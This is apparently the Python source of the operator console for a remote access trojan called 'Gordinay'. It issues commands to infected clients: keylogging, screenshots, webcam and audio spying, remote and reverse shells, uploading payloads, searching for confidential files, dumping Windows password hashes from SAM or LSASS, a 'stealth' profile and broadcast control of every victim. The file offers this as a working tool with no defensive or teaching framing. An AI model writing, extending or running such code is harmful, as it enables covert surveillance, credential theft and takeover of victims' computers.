"""
Server CLI - Interactive command-line interface
Provides commands to control clients and manage the server
"""

from datetime import datetime
from pathlib import Path
from tabulate import tabulate
import threading, sys, os, cmd, cv2

class ServerCLI(cmd.Cmd):
    """Interactive command-line interface for Gordinay server"""
    
    intro = '''
    ╔═══════════════════════════════════════════════════════════╗
    ║                 GORDINAY SERVER CONSOLE                   ║
    ║              Remote Administration Tool v1.0              ║
    ╚═══════════════════════════════════════════════════════════╝
    
    Type 'help' or '?' to list available commands.
    Type 'list' to see connected clients.
    Type 'exit' or 'quit' to stop the server.
    '''
    
    prompt = 'Gordinay-Server> '
    
    def __init__(self, server, printer=None) -> None:
        """
        Initialize CLI
        Args:
            server: ServerSocket instance
        """

        super().__init__()
        self.server = server
        self.print = printer
        self.selected_client = None

        if os.name != 'nt':  # Unix/Linux
            import termios
            import tty
            try:
                self.old_settings = termios.tcgetattr(sys.stdin)
            except:
                self.old_settings = None
    
    # ==================== BASIC COMMANDS ====================
    
    def do_exit(self, arg) -> None:
        """Exit the server console and stop the server"""
        
        self.print("\nShutting down server...",'critical')
        return self._exit_server()
    
    def do_quit(self, arg) -> None:
        """Alias for exit"""
        return self._exit_server()
    
    def do_clear(self, arg) -> None:
        """Clear the console screen"""

        os.system('cls' if os.name == 'nt' else 'clear')
    
    def do_EOF(self, arg) -> None:
        """Handle Ctrl+D"""

        return self._exit_server()
    
    def _exit_server(self) -> None:
        """Clean exit helper"""

        self.print("\nShutting down server..." ,'critical')
        
        # Disconnect all clients
        if self.server.clients:
            self.print(f"Disconnecting {len(self.server.clients)} client(s)..." ,'critical')
            for client_id in list(self.server.clients.keys()):
                try:
                    self.server.clients[client_id].running = False
                except:
                    pass
        
        # Stop server
        self.server.stop()
        
        self._restore_terminal()
        
        self.print("Server stopped. Goodbye!",'critical')
        
        # Force exit
        os._exit(0)
    
    def _restore_terminal(self) -> None:
        """Restore terminal to normal state"""

        try:
            if os.name == 'nt':  # Windows
                # Reset console mode
                import ctypes
                kernel32 = ctypes.windll.kernel32
                kernel32.SetConsoleMode(kernel32.GetStdHandle(-10), 7)
            else:  # Unix/Linux
                import termios
                if hasattr(self, 'old_settings') and self.old_settings:
                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_settings)
                
                # Force reset terminal
                os.system('stty sane')
        
        except Exception as e:
            self.print(f"Could not restore terminal: {e}",'critical')
    
    def cmdloop(self, intro=None) -> None:
        """Override cmdloop to handle exceptions properly"""
        try:
            super().cmdloop(intro)
        except KeyboardInterrupt:
            self.print("\nInterrupted by user", 'critical')
            self._exit_server()
        except Exception as e:
            self.print(f"\nError in command loop: {e}", 'critical')
            self._exit_server()
        finally:
            self._restore_terminal()
    
    # ==================== CLIENT MANAGEMENT ====================
    
    def do_list(self, arg) -> None:
        """
        List all connected clients
        Usage: list
        """

        clients = self.server.get_all_clients()
        
        if not clients:
            self.print("No clients connected\n",'critical')
            return
        
        try:
            # Prepare table data
            table_data = []
            for client in clients:
                info = client.get_info()
                table_data.append([
                    info['client_id'],
                    info['hostname'],
                    info['os'],
                    f"{info['address'][0]}:{info['address'][1]}",
                    f"{info['uptime_seconds']}s",
                    info['messages_received'],
                    info['messages_sent']
                ])
            
            # Display table
            headers = ['ID', 'Hostname', 'OS', 'Address', 'Uptime', 'Recv', 'Sent']
            self.print("\n" + tabulate(table_data, headers=headers, tablefmt='grid'), 'info')
            self.print(f"\nTotal clients: {len(clients)}\n",'info')
        
        except ImportError:
            # Fallback if tabulate not available
            self.print("\n" + "="*70, 'info')
            self.print(f"{'ID':<10} {'Hostname':<15} {'OS':<10} {'Address':<20} {'Uptime':<10}", 'info')
            self.print("="*70, 'info')
            for client in clients:
                info = client.get_info()
                self.print(f"{info['client_id']:<10} {info['hostname']:<15} {info['os']:<10} "
                      f"{info['address'][0]}:{info['address'][1]:<20} {info['uptime_seconds']}s", 'info')
            self.print("="*70, 'info')
            self.print(f"Total clients: {len(clients)}\n", 'info')
    
    def do_select(self, arg) -> None:
        """
        Select a client by ID for further commands
        Usage: select <client_id>
        """
        
        if not arg:
            self.print("Usage: select <client_id>", 'critical')
            self.print("Use 'list' to see available client IDs\n", 'critical')
            return
        
        client = self.server.get_client(arg)
        
        if not client:
            self.print(f"Client {arg} not found", 'critical')
            self.print("Use 'list' to see available clients\n", 'critical')
            return
        
        self.selected_client = client
        self.prompt = f'RAT-Server ({arg})> '
        self.print(f"Selected client: {arg}\n", 'info')
    
    def do_deselect(self, arg) -> None:
        """
        Deselect current client
        Usage: deselect
        """

        if not self.selected_client:
            self.print("No client currently selected\n", 'critical')
            return
        
        self.selected_client = None
        self.prompt = 'RAT-Server> '
        self.print("Client deselected\n", 'info')
    
    def do_info(self, arg) -> None:
        """
        Show detailed information about selected client or specific client
        Usage: info [client_id]
        """

        if arg:
            client = self.server.get_client(arg)
        else:
            client = self.selected_client
        
        if not client:
            self.print("No client selected. Use 'select <client_id>' first\n", 'critical')
            return
        
        info = client.get_info()
        
        self.print("\n" + "="*60, 'info')
        self.print(f"Client ID:        {info['client_id']}", 'info')
        self.print(f"Hostname:         {info['hostname']}", 'info')
        self.print(f"Operating System: {info['os']}", 'info')
        self.print(f"IP Address:       {info['address'][0]}", 'info')
        self.print(f"Port:             {info['address'][1]}", 'info')
        self.print(f"Connected:        {info['connected']}", 'info')
        self.print(f"Connection Time:  {info['connection_time']}", 'info')
        self.print(f"Uptime:           {info['uptime_seconds']} seconds", 'info')
        self.print("-"*60, 'info')
        self.print(f"Bytes Sent:       {info['bytes_sent']:,}", 'info')
        self.print(f"Bytes Received:   {info['bytes_received']:,}", 'info')
        self.print(f"Messages Sent:    {info['messages_sent']}", 'info')
        self.print(f"Messages Received: {info['messages_received']}", 'info')
        self.print("-"*60, 'info')
        self.print("Features:", 'info')
        for feature, enabled in info.get('features', {}).items():
            status = "✓" if enabled else "✗"
            self.print(f"  {status} {feature}", 'info')
        self.print("="*60 + "\n", 'info')
    
    def do_disconnect(self, arg) -> None:
        """
        Disconnect a client
        Usage: disconnect [client_id]
        """

        if arg:
            client = self.server.get_client(arg)
        else:
            client = self.selected_client
        
        if not client:
            self.print("No client selected\n", 'critical')
            return
        
        client_id = client.client_id
        self.print(f"Disconnecting client {client_id}...", 'info')
        client.disconnect()
        self.print(f"Client {client_id} disconnected\n", 'info')
        
        if self.selected_client == client:
            self.do_deselect(None)
    
    def do_stats(self, arg) -> None:
        """
        Show server statistics
        Usage: stats
        """
        
        stats = self.server.get_statistics()
        
        if not stats:
            self.print("No statistics available\n", 'critical')
            return
        
        self.print("\n" + "="*60, 'info')
        self.print("SERVER STATISTICS", 'info')
        self.print("="*60, 'info')
        self.print(f"Host:              {stats['host']}", 'info')
        self.print(f"Port:              {stats['port']}", 'info')
        self.print(f"SSL/TLS:           {'Enabled' if stats['ssl_enabled'] else 'Disabled'}", 'info')
        self.print(f"Uptime:            {stats['uptime_seconds']} seconds", 'info')
        self.print(f"Active Clients:    {stats['active_clients']}", 'info')
        self.print(f"Total Connections: {stats['total_connections']}", 'info')
        self.print("="*60 + "\n", 'info')
    
    # ==================== CLIENT COMMANDS ====================
    
    def _ensure_client_selected(self) -> bool:
        """Helper to ensure a client is selected"""

        if not self.selected_client:
            self.print("No client selected. Use 'select <client_id>' first\n", 'critical')
            return False
        if not self.selected_client.connected:
            self.print("Selected client is not connected\n", 'critical')
            return False
        return True
    
    def do_screenshot(self, arg) -> None:
        """
        Request a screenshot from selected client
        Usage: screenshot
        """

        if not self._ensure_client_selected():
            return
        
        self.print(f"Requesting screenshot from {self.selected_client.client_id}...", 'info')
        self.selected_client.send_command('screenshot')
        self.print("Screenshot command sent\n", 'info')
    
    def do_keylogger(self, arg) -> None:
        """
        Control keylogger on selected client
        Usage: keylogger <start|stop>
        """

        if not self._ensure_client_selected():
            return
        
        if not arg or arg not in ['start', 'stop']:
            self.print("Usage: keylogger <start|stop>\n", 'info')
            return
        
        command = f'keylogger_{arg}'
        self.print(f"Sending keylogger {arg} command...", 'info')
        self.selected_client.send_command(command)
        self.print(f"Keylogger {arg} command sent\n", 'info')
    
    def do_stream(self, arg) -> None:
        """
        Control webcam stream
        Usage: stream <start|stop|view|save>
        
        Commands:
            start              - Start webcam stream on client
            stop               - Stop webcam stream on client
            view               - Enable live view (OpenCV window)
            save <on|off>      - Toggle frame saving
        
        Examples:
            stream start       - Start streaming
            stream view        - Open live view window
            stream save on     - Save all frames to disk
            stream stop        - Stop streaming
        """

        if not self._ensure_client_selected():
            return
        
        args = arg.split()
        
        if not args:
            self.print("Usage: stream <start|stop|view|save>\n", 'info')
            return
        
        action = args[0].lower()
        
        if action == 'start':
            self.print(f"Starting webcam stream on {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('stream_start')
            self.print("Stream start request sent", 'info')
            self.print("Use 'stream view' to see the live feed\n", 'info')
        
        elif action == 'stop':
            self.print(f"Stopping webcam stream on {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('stream_stop')
            
            cv2.destroyAllWindows()
            
            self.print("Stream stop request sent\n", 'info')
        
        elif action == 'view':
            self.print(f"Live view enabled for {self.selected_client.client_id}", 'info')
            self.print("Webcam stream will display in a popup window", 'info')
            self.print("Press 'q' in the window to close", 'info')
            self.print("Note: Stream must be started first (stream start)\n", 'info')
        
        elif action == 'save':
            if len(args) < 2:
                self.print("Usage: stream save <on|off>\n", 'info')
                return
            
            toggle = args[1].lower()
            
            if toggle == 'on':
                self.selected_client.save_stream_frames = True
                self.print(f"Frame saving enabled for {self.selected_client.client_id}", 'info')
                self.print(f"Frames will be saved to: {self.selected_client.data_dir}/webcam_stream/\n", 'info')
            
            elif toggle == 'off':
                self.selected_client.save_stream_frames = False
                self.print(f"Frame saving disabled for {self.selected_client.client_id}\n", 'info')
            
            else:
                self.print("Invalid option. Use 'on' or 'off'\n", 'info')
        
        else:
            self.print(f"Unknown stream command: {action}", 'info')
            self.print("    Use 'help stream' for available commands\n", 'info')
    
    def do_webcam(self, arg) -> None:
        """
        Request a single webcam snapshot from selected client
        Usage: webcam
        """

        if not self._ensure_client_selected():
            return
        
        self.print(f"Requesting webcam snapshot from {self.selected_client.client_id}...", 'info')
        self.selected_client.send_command('webcam_snapshot')
        self.print("Webcam snapshot command sent\n", 'info')
    
    def do_ipconfig(self, arg) -> None:
        """
        Request network configuration from selected client
        Usage: ipconfig
        """
        if not self._ensure_client_selected():
            return
        
        self.print(f"Requesting network info from {self.selected_client.client_id}...", 'info')
        self.selected_client.send_command('ipconfig')
        self.print("Network info command sent\n", 'info')
    
    def do_shell(self, arg) -> None:
        """
        Execute a shell command on selected client
        Usage: shell <command>
        Example: shell dir C:\\Users
        """
        
        if not self._ensure_client_selected():
            return
        
        if not arg:
            self.print("Usage: shell <command>\n", 'info')
            return
        
        self.print(f"Executing shell command: {arg}", 'info')
        
        self.selected_client.send_command('shell', shell_cmd=arg)
        self.print("Shell command sent\n", 'info')
    
    def do_download(self, arg) -> None:
        """
        Download a file from selected client
        Usage: download <remote_path>
        Example: download C:\\Users\\user\\document.txt
        """

        if not self._ensure_client_selected():
            return
        
        if not arg:
            self.print("Usage: download <remote_path>\n", 'info')
            return
        
        self.print(f"Requesting download: {arg}", 'info')
        self.selected_client.send_command('download', filepath=arg) 
        self.print("Download request sent\n", 'info')

    def do_webcam_control(self, arg) -> None:
        """
        Control webcam snapshot feature
        Usage: webcam_control <start|stop> [interval]
        
        Examples:
            webcam_control start      - Start with default interval (30s)
            webcam_control start 60   - Start with 60s interval
            webcam_control stop       - Stop webcam snapshots
        """

        if not self._ensure_client_selected():
            return
        
        args = arg.split()
        
        if not args:
            self.print("Usage: webcam_control <start|stop> [interval]\n", 'info')
            return
        
        action = args[0].lower()
        
        if action == 'start':
            interval = int(args[1]) if len(args) > 1 else 30
            self.print(f"Starting webcam snapshot (interval: {interval}s)...", 'info')
            self.selected_client.send_command('webcam_snapshot_start', interval=interval)
            self.print("Webcam snapshot start request sent\n", 'info')
        
        elif action == 'stop':
            self.print(f"Stopping webcam snapshot...", 'info')
            self.selected_client.send_command('webcam_snapshot_stop')
            self.print("Webcam snapshot stop request sent\n", 'info')
        
        else:
            self.print(f"Unknown action: {action}", 'info')
            self.print("    Use: webcam_control <start|stop> [interval]\n", 'info')

    def do_download_logs(self, arg) -> None:
        """
        Download all logs from selected client as a ZIP archive
        Usage: download_logs
        """

        if not self._ensure_client_selected():
            return
        
        self.print(f"Requesting logs archive from {self.selected_client.client_id}...", 'info')
        self.print("This may take a moment depending on logs size...", 'info')
        self.selected_client.send_command('download_logs')
        self.print("Logs archive request sent\n", 'info')

    def do_upload(self, arg) -> None:
        """
        Upload a file to selected client
        Usage: upload <local_path> <remote_path>
        Example: upload payload.exe C:\\Users\\Public\\payload.exe
        """

        if not self._ensure_client_selected():
            return
        
        args = arg.split(maxsplit=1)
        if len(args) != 2:
            self.print("Usage: upload <local_path> <remote_path>", 'info')
            self.print("    Example: upload payload.exe C:\\Users\\Public\\payload.exe\n", 'info')
            return
        
        local_path, remote_path = args
        
        try:
            from pathlib import Path
            import base64
            
            path = Path(local_path)
            
            if not path.exists():
                self.print(f"File not found: {local_path}\n", 'info')
                return
            
            if not path.is_file():
                self.print(f"Not a file: {local_path}\n", 'info')
                return
            
            file_size = path.stat().st_size
            self.print(f"File size: {file_size:,} bytes ({file_size / 1024 / 1024:.2f} MB)", 'info')
            
            if file_size > 100 * 1024 * 1024:
                confirm = input(f"[?] File is large ({file_size / 1024 / 1024:.2f} MB). Continue? (y/n): ")
                if confirm.lower() != 'y':
                    self.print("Cancelled\n", 'info')
                    return
            
            self.print(f"Reading file: {local_path}", 'info')
            with open(path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode('utf-8')
            
            self.print(f"Uploading {path.name} to {remote_path}...", 'info')
            self.selected_client.send_command('upload', 
                                            filepath=remote_path,
                                            data=file_data,
                                            filename=path.name)
            self.print("Upload request sent\n", 'info')
        
        except PermissionError:
            self.print(f"Permission denied: {local_path}\n", 'info')
        except Exception as e:
            self.print(f"Error reading file: {e}\n", 'info')

    def do_hashdump(self, arg) -> None:
        """
        Dump Windows password hashes from selected client
        Usage: hashdump [sam|lsass]
        
        Options:
            sam   - Dump from SAM registry (default, safer)
            lsass - Dump from LSASS memory (can trigger AV)
        
        Note: Requires Administrator privileges on client
        """

        if not self._ensure_client_selected():
            return
        
        method = arg.strip().lower() or 'sam'
        
        if method not in ['sam', 'lsass']:
            self.print("Usage: hashdump [sam|lsass]", 'info')
            self.print("    sam   - Dump from SAM registry (default)", 'info')
            self.print("    lsass - Dump from LSASS memory\n", 'info')
            return
        
        if method == 'lsass':
            self.print("WARNING: LSASS dump can trigger antivirus!", 'info')
            self.print("Use with caution in production environments", 'info')
            confirm = input("[?] Continue? (y/n): ")
            if confirm.lower() != 'y':
                self.print("Cancelled\n", 'info')
                return
        
        self.print(f"Requesting hash dump ({method.upper()}) from {self.selected_client.client_id}...", 'info')
        
        if method == 'sam':
            self.selected_client.send_command('hashdump')
        else:
            self.selected_client.send_command('hashdump_lsass')
        
        self.print("Hash dump request sent", 'info')
        self.print("Note: Client requires Administrator privileges", 'info')
        self.print("Results will appear when received...\n", 'info')

    def do_restart(self, arg) -> None:
        """
        Restart the selected client
        Usage: restart
        """
        
        if not self._ensure_client_selected():
            return
        
        self.print(f"Sending restart command to {self.selected_client.client_id}...", 'info')
        self.selected_client.send_command('restart')
        self.print("Restart command sent\n", 'info')
    
    def do_stop(self, arg) -> None:
        """
        Stop the selected client (terminate)
        Usage: stop
        """
        
        if not self._ensure_client_selected():
            return
        
        confirm = input(f"[?] Are you sure you want to stop client {self.selected_client.client_id}? (y/n): ")
        
        if confirm.lower() != 'y':
            self.print("Cancelled\n", 'info')
            return
        
        self.print(f"Sending stop command to {self.selected_client.client_id}...", 'info')
        self.selected_client.send_command('stop')
        self.print("Stop command sent\n", 'info')
    
    def do_ping(self, arg) -> None:
        """
        Ping the selected client
        Usage: ping
        """

        if not self._ensure_client_selected():
            return
        
        self.print(f"Pinging {self.selected_client.client_id}...", 'info')
        self.selected_client.send({
            'type': 'ping',
            'timestamp': datetime.now().isoformat()
        })
        self.print("Ping sent\n", 'info')
    
    def do_search(self, arg) -> None:
        """
        Search for files on selected client
        Usage: search <pattern>
        Example: search *.pdf
        """
        
        if not self._ensure_client_selected():
            return
        
        if not arg:
            self.print("Usage: search <pattern>\n", 'info')
            self.print("Examples:", 'info')
            self.print("  search *.pdf", 'info')
            self.print("  search report*.docx", 'info')
            self.print("  search confidential*\n", 'info')
            return
        
        self.print(f"Searching for: {arg}", 'info')
        self.selected_client.send_command('search', pattern=arg)  # ✅ OK
        self.print("Search request sent\n", 'info')
    
    # ==================== BROADCAST COMMANDS ====================
    
    def do_broadcast(self, arg) -> None:
        """
        Send a command to all connected clients
        Usage: broadcast <command> [args]
        """
        
        if not arg:
            self.print("Usage: broadcast <command> [args]\n", 'info')
            return
        
        clients = self.server.get_all_clients()
        
        if not clients:
            self.print("No clients connected\n", 'info')
            return
        
        # Parse command and args
        parts = arg.split(maxsplit=1)
        command = parts[0]
        kwargs = {}
        
        if len(parts) > 1:
            kwargs['args'] = parts[1]
        
        self.print(f"Broadcasting command to {len(clients)} clients: {command}", 'info')
        
        self.server.broadcast({
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat(),
            **kwargs
        })
        
        self.print(f"Broadcast sent to {len(clients)} clients\n", 'info')

    # ==================== Audio Commands ====================

    def do_audio(self, arg) -> None:
        """
        Audio recording commands
        Usage: audio <record|start|stop|devices> [options]
        
        Commands:
            record [duration]     - Record audio once (default: 10s)
            start [duration] [interval] - Start continuous recording
            stop                  - Stop continuous recording
            devices               - List audio devices
        
        Examples:
            audio record          - Record 10 seconds
            audio record 30       - Record 30 seconds
            audio start 10 60     - Record 10s every 60s
            audio stop            - Stop recording
            audio devices         - Show audio devices
        """

        if not self._ensure_client_selected():
            return
        
        args = arg.split()
        
        if not args:
            self.print("Usage: audio <record|start|stop|devices> [options]", 'info')
            self.print("    Use 'help audio' for more information\n", 'info')
            return
        
        command = args[0].lower()
        
        if command == 'record':
            duration = int(args[1]) if len(args) > 1 else 10
            self.print(f"Requesting audio recording ({duration}s) from {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('audio_record', duration=duration)
            self.print("Audio record request sent\n", 'info')
        
        elif command == 'start':
            duration = int(args[1]) if len(args) > 1 else 10
            interval = int(args[2]) if len(args) > 2 else 60
            self.print(f"Starting continuous audio recording...", 'info')
            self.print(f"    Duration: {duration}s per recording", 'info')
            self.print(f"    Interval: {interval}s between recordings", 'info')
            self.selected_client.send_command('audio_start', duration=duration, interval=interval)
            self.print("Audio start request sent\n", 'info')
        
        elif command == 'stop':
            self.print(f"Stopping audio recording on {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('audio_stop')
            self.print("Audio stop request sent\n", 'info')
        
        elif command == 'devices':
            self.print(f"Requesting audio device info from {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('audio_device_info')
            self.print("Audio device info request sent\n", 'info')
        
        else:
            self.print(f"Unknown audio command: {command}", 'info')
            self.print("    Use 'help audio' for available commands\n", 'info')

    # ==================== DATA MANAGEMENT ====================
    
    def do_data(self, arg) -> None:
        """
        Show data directory for selected client
        Usage: data [client_id]
        """

        if arg:
            client = self.server.get_client(arg)
        else:
            client = self.selected_client
        
        if not client:
            self.print("No client selected\n", 'info')
            return
        
        data_dir = client.data_dir
        
        self.print(f"\nData directory: {data_dir.absolute()}", 'info')
        
        if not data_dir.exists():
            self.print("Directory does not exist yet\n", 'info')
            return
        
        # List contents
        self.print("\nContents:", 'info')
        for item in sorted(data_dir.iterdir()):
            if item.is_dir():
                # Count files in directory
                file_count = len(list(item.iterdir()))
                self.print(f"    {item.name}/ ({file_count} items)", 'info')
            else:
                size = item.stat().st_size
                self.print(f"    {item.name} ({size:,} bytes)", 'info')
    
    # ==================== Config ==================

    def do_config(self, arg) -> None:
        """
        Manage client configuration
        Usage: config <show|set|profile|list>
        
        Commands:
            show                          - Show current configuration
            set <param> <value>           - Set a parameter
            profile <name>                - Load a configuration profile
            list                          - List available profiles
        
        Examples:
            config show
            config set screenshot_interval 120
            config set webcam_stream_fps 20
            config set webcam_stream_resolution 1280x720
            config profile stealth
            config list
        """

        if not self._ensure_client_selected():
            return
        
        args = arg.split()
        
        if not args:
            self.print("Usage: config <show|set|profile|list>\n", 'info')
            self.print("    Use 'help config' for more information\n", 'info')
            return
        
        action = args[0].lower()
        
        if action == 'show':
            self.print(f"Requesting configuration from {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('config_get')
            self.print("Config request sent\n", 'info')
        
        elif action == 'set':
            if len(args) < 3:
                self.print("Usage: config set <param> <value>\n", 'info')
                self.print("Available parameters:", 'info')
                self.print("  - keylogger_interval", 'info')
                self.print("  - webcam_interval", 'info')
                self.print("  - webcam_stream_fps", 'info')
                self.print("  - webcam_stream_resolution (format: 640x480)", 'info')
                self.print("  - webcam_stream_quality", 'info')
                self.print("  - screenshot_interval", 'info')
                self.print("  - screenshot_quality", 'info')
                self.print("  - network_info_interval", 'info')
                self.print("  - audio_duration", 'info')
                self.print("  - audio_interval\n", 'info')
                return
            
            param = args[1]
            value = args[2]
            
            self.print(f"Setting {param} = {value} on {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('config_set', param=param, value=value)
            self.print("Config set request sent\n", 'info')
        
        elif action == 'profile':
            if len(args) < 2:
                self.print("Usage: config profile <name>\n", 'info')
                self.print("Available profiles:", 'info')
                self.print("  - stealth      : Low resource usage, long intervals", 'info')
                self.print("  - performance  : High quality, short intervals", 'info')
                self.print("  - balanced     : Moderate settings (default)", 'info')
                self.print("  - minimal      : Minimal activity, very long intervals\n", 'info')
                return
            
            profile = args[1]
            
            self.print(f"Loading profile '{profile}' on {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('config_profile', profile=profile)
            self.print("Profile load request sent\n", 'info')
        
        elif action == 'list':
            self.print("\nAvailable Configuration Profiles:", 'info')
            self.print("="*70, 'info')
            
            profiles = {
                'stealth': 'Low resource usage, long intervals, low quality',
                'performance': 'High quality, short intervals, high resource usage',
                'balanced': 'Moderate settings, good balance (default)',
                'minimal': 'Minimal activity, very long intervals'
            }
            
            for name, desc in profiles.items():
                print(f"  {name:<15} - {desc}")
            
            self.print("="*70, 'info')
            self.print("\nUsage: config profile <name>\n", 'info')
        
        else:
            self.print(f"Unknown config action: {action}", 'error')
            self.print("    Use 'help config' for available commands\n", 'info')
    
    # ==================== Reverse ====================
    
    def do_reverse_shell(self, arg) -> None:
        """
        Interactive reverse shell
        Usage: reverse_shell <start|stop|exit>
            <command>  (when shell is active)
        
        Commands:
            start   - Start reverse shell
            stop    - Stop reverse shell
            exit    - Exit shell mode (back to RAT-Server)
        
        When shell is active, type commands directly.
        Press Ctrl+C or type 'exit' to return to main menu.
        
        Examples:
            reverse_shell start
            dir
            cd C:\\Users
            ipconfig
            exit
        """

        if not self._ensure_client_selected():
            return
        
        args = arg.split() if arg else []
        
        if not args:
            self.print("Usage: reverse_shell <start|stop>\n", 'info')
            return
        
        action = args[0].lower()
        
        if action == 'start':
            self.print(f"Starting reverse shell on {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('reverse_shell_start')
            self.print("Reverse shell start request sent", 'info')
            self.print("Entering shell mode... Type commands directly.", 'info')
            self.print("Type 'exit' or press Ctrl+C to return to RAT console\n", 'info')
            
            # Enter shell mode
            self._shell_mode()
        
        elif action == 'stop':
            self.print(f"Stopping reverse shell on {self.selected_client.client_id}...", 'info')
            self.selected_client.send_command('reverse_shell_stop')
            self.print("Reverse shell stop request sent\n", 'info')
        
        else:
            self.print(f"Unknown action: {action}\n", 'error')

    def _shell_mode(self) -> None:
        """Interactive shell mode"""
        self.print("="*70, 'info')
        self.print(f"REVERSE SHELL MODE - Client: {self.selected_client.client_id}", 'info')
        self.print("="*70, 'info')
        self.print("Type 'exit' to stop shell and return to console", 'info')
        self.print("", 'info')
        
        try:
            while True:
                try:
                    # Prompt
                    user_input = input(f"{self.selected_client.client_id}> ")
                    
                    # Strip whitespace
                    command = user_input.strip()
                    
                    # Check for exit
                    if command.lower() in ['exit', 'quit', 'q']:
                        self.print("\nStopping reverse shell...", 'info')
                        self.selected_client.send_command('reverse_shell_stop')
                        
                        # Small delay
                        import time
                        time.sleep(0.5)
                        
                        self.print("Exiting shell mode...", 'info')
                        break
                    
                    # Send command if not empty
                    if command:
                        self.selected_client.send_command('reverse_shell_cmd', command=command)
                
                except EOFError:
                    self.print("\nEOF - Exiting shell mode...", 'info')
                    break
                
                except KeyboardInterrupt:
                    # Ctrl+C pressed
                    self.print("\n\nInterrupted!", 'info')
                    
                    # Ask what to do
                    try:
                        choice = input("Stop shell on client? (y/n): ").lower()
                        if choice == 'y':
                            self.selected_client.send_command('reverse_shell_stop')
                            self.print("Shell stopped", 'info')
                        else:
                            self.print("Shell still running on client", 'info')
                    except:
                        pass
                    
                    break
        
        except Exception as e:
            self.print(f"\nError in shell mode: {e}", 'error')
        
        self.print("\nReturned to RAT console\n", 'info')
        
    # ==================== HELP ====================

    def help_reverse_shell(self) -> None:
        """Help for reverse_shell command"""

        self.print("""
    Reverse Shell - Interactive Shell Access
    =========================================

    Start an interactive shell session with the client.
    Unlike the 'shell' command which executes single commands,
    this provides a persistent shell connection.

    Usage:
        reverse_shell start     Start interactive shell
        reverse_shell stop      Stop shell session

    When in shell mode:
        - Type commands directly
        - Output appears in real-time
        - Type 'exit' to return to RAT console
        - Press Ctrl+C to force exit

    Examples:
        
        1. Start shell and navigate:
        RAT-Server (abc123)> reverse_shell start
        abc123> cd C:\\Users
        abc123> dir
        abc123> exit
        
        2. Run multiple commands:
        RAT-Server (abc123)> reverse_shell start
        abc123> ipconfig
        abc123> whoami
        abc123> systeminfo
        abc123> exit
        
        3. Stop shell remotely:
        RAT-Server (abc123)> reverse_shell stop

    Notes:
        - Shell persists until you type 'exit' or stop it
        - More efficient for multiple commands
        - Supports interactive commands
        - Works on both Windows (cmd.exe) and Linux (bash)

    Comparison with 'shell' command:
        shell <cmd>        - Execute single command, get result
        reverse_shell      - Interactive session, multiple commands
        """, "info")

    def do_help(self, arg) -> None:
        '''Show help for commands'''

        if arg:
            super().do_help(arg)
        else:
            self.print("\n" + "="*70, "info")
            self.print("AVAILABLE COMMANDS", "info")
            self.print("="*70, "info")
            
            commands = {
                'Client Management': [
                    ('list', 'List all connected clients'),
                    ('select <id>', 'Select a client for commands'),
                    ('deselect', 'Deselect current client'),
                    ('info [id]', 'Show client information'),
                    ('disconnect [id]', 'Disconnect a client'),
                    ('stats', 'Show server statistics'),
                ],
                'Configuration': [
                    ('config show', 'Show client configuration'),
                    ('config set <param> <value>', 'Set a parameter'),
                    ('config profile <name>', 'Load configuration profile'),
                    ('config list', 'List available profiles'),
                ],
                'Capture Commands': [
                    ('screenshot', 'Request screenshot'),
                    ('webcam', 'Request webcam snapshot'),
                    ('webcam_control <start|stop>', 'Control webcam snapshot feature'),
                ],
                'Stream Commands': [
                    ('stream <start|stop>', 'Control webcam stream'),
                    ('stream_stats', 'Show stream statistics'),
                ],
                'Monitoring': [
                    ('keylogger <start|stop>', 'Control keylogger'),
                    ('ipconfig', 'Request network info'),
                ],
                'Audio Commands': [
                    ('audio record [duration]', 'Record audio once'),
                    ('audio start [dur] [int]', 'Start continuous recording'),
                    ('audio stop', 'Stop continuous recording'),
                    ('audio devices', 'List audio devices'),
                ],
                'System Commands': [
                    ('shell <cmd>', 'Execute single shell command'),
                    ('reverse_shell <start|stop>', 'Interactive reverse shell'),
                    ('restart', 'Restart client'),
                    ('stop', 'Stop client'),
                    ('ping', 'Ping client'),
                ],
                'File Management': [
                    ('download <path>', 'Download file from client'),
                    ('upload <local> <remote>', 'Upload file to client'),
                    ('search <pattern>', 'Search for files'),
                    ('download_logs', 'Download all logs as ZIP'),
                ],
                'Advanced': [
                    ('hashdump [sam|lsass]', 'Dump Windows password hashes'),
                ],
                'Broadcast': [
                    ('broadcast <cmd>', 'Send command to all clients'),
                ],
                'Data Management': [
                    ('data [id]', 'Show client data directory'),
                ],
                'General': [
                    ('clear', 'Clear console'),
                    ('help [cmd]', 'Show help'),
                    ('exit/quit', 'Exit server'),
                ]
            }
            
            for category, cmds in commands.items():
                self.print(f"\n{category}:", "info")
                for cmd, desc in cmds:
                    self.print(f"  {cmd:<35} {desc}")
            
            self.print("\n" + "="*70, "info")
            self.print("\nConfiguration Profiles:", "info")
            self.print("  stealth      - Low resource usage (long intervals, low quality)", "info")
            self.print("  performance  - High quality (short intervals, high resource)", "info")
            self.print("  balanced     - Default balanced settings", "info")
            self.print("  minimal      - Minimal activity (very long intervals)", "info")
            
            self.print("\nConfigurable Parameters:", "info")
            self.print("  keylogger_interval, webcam_interval, screenshot_interval,", "info")
            self.print("  webcam_stream_fps, webcam_stream_resolution, webcam_stream_quality,", "info")
            self.print("  screenshot_quality, network_info_interval, audio_duration, audio_interval", "info")
            
            self.print("\nReverse Shell:", "info")
            self.print("  Interactive shell mode - Type commands directly after 'reverse_shell start'", "info")
            self.print("  Use 'exit' to return to RAT console", "info")
            
            self.print("\n" + "="*70 + "\n", "info")